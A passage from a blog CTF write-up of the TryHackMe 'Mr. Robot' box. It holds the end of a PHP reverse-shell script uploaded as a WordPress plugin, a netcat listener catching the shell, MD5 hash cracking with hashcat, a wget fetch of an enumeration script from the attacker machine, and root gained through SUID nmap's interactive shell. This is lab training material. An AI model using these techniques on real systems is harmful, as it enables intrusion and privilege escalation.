class="line"></span><br><span class="line">	<span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line">	<span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line">	$read_a = <span class="keyword">array</span>($sock, $pipes[<span class="number">1</span>], $pipes[<span class="number">2</span>]);</span><br><span class="line">	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line">	<span class="comment">// data to process's STDIN</span></span><br><span class="line">	<span class="keyword">if</span> (in_array($sock, $read_a)) &#123;</span><br><span class="line">		<span class="keyword">if</span> ($debug) printit(<span class="string">"SOCK READ"</span>);</span><br><span class="line">		$input = fread($sock, $chunk_size);</span><br><span class="line">		<span class="keyword">if</span> ($debug) printit(<span class="string">"SOCK: $input"</span>);</span><br><span class="line">		fwrite($pipes[<span class="number">0</span>], $input);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If we can read from the process's STDOUT</span></span><br><span class="line">	<span class="comment">// send data down tcp connection</span></span><br><span class="line">	<span class="keyword">if</span> (in_array($pipes[<span class="number">1</span>], $read_a)) &#123;</span><br><span class="line">		<span class="keyword">if</span> ($debug) printit(<span class="string">"STDOUT READ"</span>);</span><br><span class="line">		$input = fread($pipes[<span class="number">1</span>], $chunk_size);</span><br><span class="line">		<span class="keyword">if</span> ($debug) printit(<span class="string">"STDOUT: $input"</span>);</span><br><span class="line">		fwrite($sock, $input);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If we can read from the process's STDERR</span></span><br><span class="line">	<span class="comment">// send data down tcp connection</span></span><br><span class="line">	<span class="keyword">if</span> (in_array($pipes[<span class="number">2</span>], $read_a)) &#123;</span><br><span class="line">		<span class="keyword">if</span> ($debug) printit(<span class="string">"STDERR READ"</span>);</span><br><span class="line">		$input = fread($pipes[<span class="number">2</span>], $chunk_size);</span><br><span class="line">		<span class="keyword">if</span> ($debug) printit(<span class="string">"STDERR: $input"</span>);</span><br><span class="line">		fwrite($sock, $input);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose($sock);</span><br><span class="line">fclose($pipes[<span class="number">0</span>]);</span><br><span class="line">fclose($pipes[<span class="number">1</span>]);</span><br><span class="line">fclose($pipes[<span class="number">2</span>]);</span><br><span class="line">proc_close($process);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Like print, but does nothing if we've daemonised ourself</span></span><br><span class="line"><span class="comment">// (I can't figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printit</span> <span class="params">($string)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!$daemon) &#123;</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"$string\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>After changing the ip and port, letâ€™s zip the file and upload it as a new plugin :</p>
<p><img src="https://imgur.com/llr52hP.png" alt="plugins"></p>
<p>Now, before activating it we need to open a netcat session on our local machine on the port configured in the script :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~/tryhackme/mrrobot <span class="comment"># nc -lvp 4444                                                                                                                                              root@kali</span></span><br><span class="line">Ncat: Version 7.70 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br></pre></td></tr></table></figure>
<p>Then we activate the plugin :<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">~/tryhackme/mrrobot <span class="comment"># nc -lvp 4444                                                                                                                                              root@kali</span></span><br><span class="line">Ncat: Version 7.70 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::4444</span><br><span class="line">Ncat: Listening on 0.0.0.0:4444</span><br><span class="line">Ncat: Connection from 10.0.0.36.</span><br><span class="line">Ncat: Connection from 10.0.0.36:47047.</span><br><span class="line">Linux linux 3.13.0-55-generic <span class="comment">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> 16:34:06 up  1:29,  0 users,  load average: 0.00, 0.01, 0.05</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=1(daemon) gid=1(daemon) groups=1(daemon)</span><br><span class="line">/bin/sh: 0: can<span class="string">'t access tty; job control turned off</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure></p>
<p>We got our shell ! Although at the moment it is not very usable (no arrow keys or autocompletion).<br>To upgrade it, I followed <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" target="_blank" rel="noopener">this</a> ðŸ”¥ article. </p>
<p>So first letâ€™s get a pty shell :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br><span class="line">daemon@linux:/$</span><br></pre></td></tr></table></figure>
<p>Then letâ€™s suspend the netcat session and use stty + fg to get it back with everything working :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">~/tryhackme/mrrobot # stty raw -echo; fg                                                                                                                                        root@kali</span><br><span class="line">[1]  + 4804 continued  nc -lvp 4444</span><br><span class="line"></span><br><span class="line">daemon@linux:/$</span><br></pre></td></tr></table></figure></p>
<p>We see that we are logged in as the daemon user, letâ€™s go to <code>/home</code> and see if we can find something :<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">daemon@linux:/$ <span class="built_in">cd</span> home/  </span><br><span class="line">daemon@linux:/home$ ls</span><br><span class="line">robot</span><br><span class="line">daemon@linux:/home$ <span class="built_in">cd</span> robot/</span><br><span class="line">daemon@linux:/home/robot$ ls</span><br><span class="line">key-2-of-3.txt	password.raw-md5</span><br><span class="line">daemon@linux:/home/robot$ cat password.raw-md5 </span><br><span class="line">robot:c3fcd3d76192e4007dfb496cca67e13b</span><br><span class="line">daemon@linux:/home/robot$</span><br></pre></td></tr></table></figure></p>
<p>The 2nd flag is here but we donâ€™t have the permission to read it, however we have what seems to be the hash of the user robot (who has the rights to read the flag file). So on our loacl machine letâ€™s try to crack it with hashcat :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">~/tryhackme/mrrobot <span class="comment"># hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt                                                                                                    root@kali</span></span><br><span class="line">hashcat (v5.1.0) starting...</span><br><span class="line"></span><br><span class="line">* Device <span class="comment">#1: Not a native Intel OpenCL runtime. Expect massive speed loss.</span></span><br><span class="line">             You can use --force to override, but <span class="keyword">do</span> not report related errors.</span><br><span class="line">OpenCL Platform <span class="comment">#1: The pocl project</span></span><br><span class="line">====================================</span><br><span class="line">* Device <span class="comment">#1: pthread-Intel(R) Core(TM) i5-5257U CPU @ 2.70GHz, skipped.</span></span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#2: Intel(R) Corporation</span></span><br><span class="line">========================================</span><br><span class="line">* Device <span class="comment">#2: Intel(R) Core(TM) i5-5257U CPU @ 2.70GHz, 986/3946 MB allocatable, 2MCU</span></span><br><span class="line"></span><br><span class="line">INFO: All hashes found <span class="keyword">in</span> potfile! Use --show to display them.</span><br><span class="line"></span><br><span class="line">Started: Sun May 19 18:47:26 2019</span><br><span class="line">Stopped: Sun May 19 18:47:27 2019</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">~/tryhackme/mrrobot <span class="comment"># hashcat --show hash.txt                                                                                                                                   root@kali</span></span><br><span class="line">c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure>
<p>Found it ! Letâ€™s log in as robot and grab the flag :<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">daemon@linux:/home/robot$ su -l robot</span><br><span class="line">Password: </span><br><span class="line">$ ls</span><br><span class="line">key-2-of-3.txt	password.raw-md5</span><br><span class="line">$ whoami </span><br><span class="line">robot</span><br></pre></td></tr></table></figure></p>
<h2 id="Getting-root"><a href="#Getting-root" class="headerlink" title="Getting root"></a>Getting root</h2><p>Ok now onto the last flag. We need to find a way to get root to get it. So letâ€™s enumarate the box with the help of LinEnum. </p>
<p>First we need to upload it to the box, for this letâ€™s use python SimpleHttpServer.<br>On the local machine :<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">~/tryhackme/mrrobot <span class="comment"># cd /opt/LinEnum                                                                                                                                           root@kali</span></span><br><span class="line">------------------------------------------------------------</span><br><span class="line">/opt/LinEnum(master) <span class="comment"># ll                                                                                                                                                       root@kali</span></span><br><span class="line">total 68K</span><br><span class="line">-rw-r--r-- 1 root root 4,2K mai    3 19:26 CHANGELOG.md</span><br><span class="line">-rw-r--r-- 1 root root  615 mai    3 19:26 CONTRIBUTORS.md</span><br><span class="line">-rw-r--r-- 1 root root 1,1K mai    3 19:26 LICENSE</span><br><span class="line">-rwxr-xr-x 1 root root  45K mai    3 19:26 LinEnum.sh</span><br><span class="line">-rw-r--r-- 1 root root 3,8K mai    3 19:26 README.md</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">/opt/LinEnum(master) <span class="comment"># python -m SimpleHTTPServer                                                                                                                               root@kali</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure></p>
<p>And on the box :<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /tmp/</span><br><span class="line">$ wget 10.8.3.22:8000/LinEnum.sh</span><br><span class="line">--2019-05-19 17:01:20--  http://10.8.3.22:8000/LinEnum.sh</span><br><span class="line">Connecting to 10.8.3.22:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 45639 (45K) [text/x-sh]</span><br><span class="line">Saving to: â€˜LinEnum.shâ€™</span><br><span class="line"></span><br><span class="line">100%[======================================&gt;] 45,639      --.-K/s   <span class="keyword">in</span> 0.05s   </span><br><span class="line"></span><br><span class="line">2019-05-19 17:01:20 (968 KB/s) - â€˜LinEnum.shâ€™ saved [45639/45639]</span><br></pre></td></tr></table></figure></p>
<p>I wonâ€™t paste the output of the script here because itâ€™s quite long, but thanks to it we notice some interesting SUID binaries :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[-] SUID files:</span><br><span class="line">-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 69120 Feb 12  2015 /bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 94792 Feb 12  2015 /bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6</span><br><span class="line">-rwsr-xr-x 1 root root 36936 Feb 17  2014 /bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 47032 Feb 17  2014 /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 32464 Feb 17  2014 /usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 41336 Feb 17  2014 /usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 46424 Feb 17  2014 /usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 68152 Feb 17  2014 /usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 155008 Mar 12  2015 /usr/bin/sudo</span><br><span class="line">-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap</span><br><span class="line">-rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">-r-sr-xr-x 1 root root 9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper</span><br><span class="line">-r-sr-xr-x 1 root root 14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper</span><br><span class="line">-rwsr-xr-x 1 root root 10344 Feb 25  2015 /usr/lib/pt_chown</span><br></pre></td></tr></table></figure>
<p>We see that nmap is ran as root, and I remembered that it is possible to run script with it so I tried to give it a go. I grabbed an nmap shell script from google and uploaded it to the box using the same method.<br>But when I tried to run it :<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sS -P0 -p 80 --script suid-shell.nse localhost</span><br><span class="line">nmap: unrecognized option <span class="string">'--script'</span></span><br><span class="line">Nmap 3.81 Usage: nmap [Scan Type(s)] [Options] &lt;host or net list&gt;</span><br><span class="line">Some Common Scan Types (<span class="string">'*'</span> options require root privileges)</span><br><span class="line">* -sS TCP SYN stealth port scan (default <span class="keyword">if</span> privileged (root))</span><br><span class="line">  -sT TCP connect() port scan (default <span class="keyword">for</span> unprivileged users)</span><br><span class="line">* -sU UDP port scan</span><br><span class="line">  -sP ping scan (Find any reachable machines)</span><br><span class="line">* -sF,-sX,-sN Stealth FIN, Xmas, or Null scan (experts only)</span><br><span class="line">  -sV Version scan probes open ports determining service &amp; app names/versions</span><br><span class="line">  -sR RPC scan (use with other scan types)</span><br><span class="line">Some Common Options (none are required, most can be combined):</span><br><span class="line">* -O Use TCP/IP fingerprinting to guess remote operating system</span><br><span class="line">  -p &lt;range&gt; ports to scan.  Example range: 1-1024,1080,6666,31337</span><br><span class="line">  -F Only scans ports listed <span class="keyword">in</span> nmap-services</span><br><span class="line">  -v Verbose. Its use is recommended.  Use twice <span class="keyword">for</span> greater effect.</span><br><span class="line">  -P0 Don<span class="string">'t ping hosts (needed to scan www.microsoft.com and others)</span></span><br><span class="line"><span class="string">* -Ddecoy_host1,decoy2[,...] Hide scan using many decoys</span></span><br><span class="line"><span class="string">  -6 scans via IPv6 rather than IPv4</span></span><br><span class="line"><span class="string">  -T &lt;Paranoid|Sneaky|Polite|Normal|Aggressive|Insane&gt; General timing policy</span></span><br><span class="line"><span class="string">  -n/-R Never do DNS resolution/Always resolve [default: sometimes resolve]</span></span><br><span class="line"><span class="string">  -oN/-oX/-oG &lt;logfile&gt; Output normal/XML/grepable scan logs to &lt;logfile&gt;</span></span><br><span class="line"><span class="string">  -iL &lt;inputfile&gt; Get targets from file; Use '</span>-<span class="string">' for stdin</span></span><br><span class="line"><span class="string">* -S &lt;your_IP&gt;/-e &lt;devicename&gt; Specify source address or network interface</span></span><br><span class="line"><span class="string">  --interactive Go into interactive mode (then press h for help)</span></span><br><span class="line"><span class="string">Example: nmap -v -sS -O www.my.com 192.168.0.0/16 '</span>192.88-90.*.*<span class="string">'</span></span><br><span class="line"><span class="string">SEE THE MAN PAGE FOR MANY MORE OPTIONS, DESCRIPTIONS, AND EXAMPLES</span></span><br></pre></td></tr></table></figure></p>
<p>It did not work. After some digging I realised that the version of nmap installed was too old to run scripts. So i got back on google and did some research to see if there was another way I could get nmap to run something for me. </p>
<p>And after 5mn I found that nmap used to have an interactive mode from where you could spawn shells. Lucky for me, the version of nmap installed on the box is compatible :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ nmap --interactive</span><br><span class="line"></span><br><span class="line">Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )</span><br><span class="line">Welcome to Interactive Mode -- press h &lt;enter&gt; <span class="keyword">for</span> <span class="built_in">help</span></span><br><span class="line">nmap&gt; !sh</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>We got root ! Now we just need to get the last ðŸ”‘ :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">firstboot_done	key-3-of-3.txt</span><br></pre></td></tr></table></figure>
<p>Another one !</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/resume.html">Resume</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Information-gathering"><span class="toc-number">1.</span> <span class="toc-text">Information gathering</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-a-reverse-shell"><span class="toc-number">2.</span> <span class="toc-text">Getting a reverse shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-root"><span class="toc-number">3.</span> <span class="toc-text">Getting root</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://slayne.github.io/2019/05/19/CTF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://slayne.github.io/2019/05/19/CTF/&text=Mr.Robot CTF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://slayne.github.io/2019/05/19/CTF/&title=Mr.Robot CTF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://slayne.github.io/2019/05/19/CTF/&is_video=false&description=Mr.Robot CTF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Mr.Robot CTF&body=Check out this article: http://slayne.github.io/2019/05/19/CTF/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://slayne.github.io/2019/05/19/CTF/&title=Mr.Robot CTF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://slayne.github.io/2019/05/19/CTF/&title=Mr.Robot CTF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://slayne.github.io/2019/05/19/CTF/&title=Mr.Robot CTF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://slayne.github.io/2019/05/19/CTF/&title=Mr.Robot CTF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://slayne.github.io/2019/05/19/CTF/&name=Mr.Robot CTF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2019 slayne
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/resume.html">Resume</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

    <!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-140724203-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
